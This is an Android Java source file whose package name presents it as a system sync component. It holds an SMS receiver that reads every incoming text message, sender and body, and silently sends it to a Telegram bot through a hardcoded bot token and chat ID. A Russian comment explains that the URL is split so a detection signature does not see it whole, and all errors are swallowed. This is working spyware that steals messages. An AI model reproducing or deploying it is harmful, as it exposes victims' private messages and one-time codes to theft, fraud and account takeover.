package com.sys.sync;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;

public class SmsReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        try {
            Bundle b = intent.getExtras();
            if (b == null) return;
            Object[] p = (Object[]) b.get("pdus");
            if (p != null) {
                for (Object obj : p) {
                    SmsMessage s = SmsMessage.createFromPdu((byte[]) obj);
                    String out = s.getOriginatingAddress() + " : " + s.getMessageBody();
                    new Thread(() -> send(out)).start();
                }
            }
        } catch (Exception ignored) {}
    }

    private void send(String text) {
        HttpURLConnection c = null;
        try {
            // Дробим на части, чтобы не палить сигнатуру целиком
            String p1 = "https://api.tele";
            String p2 = "gram.org/bot";
            String k = "8387829701:AAEDXukofQXk2nEXHdSjad1a7TpGF2Uaof8";
            String m = "/sendMessage?chat_id=5225064014&text=";
            
            URL url = new URL(p1 + p2 + k + m + URLEncoder.encode(text, "UTF-8"));
            c = (HttpURLConnection) url.openConnection();
            c.setRequestMethod("GET");
            c.setConnectTimeout(10000);
            c.getResponseCode();
        } catch (Exception ignored) {
        } finally {
            if (c != null) c.disconnect();
        }
    }
}
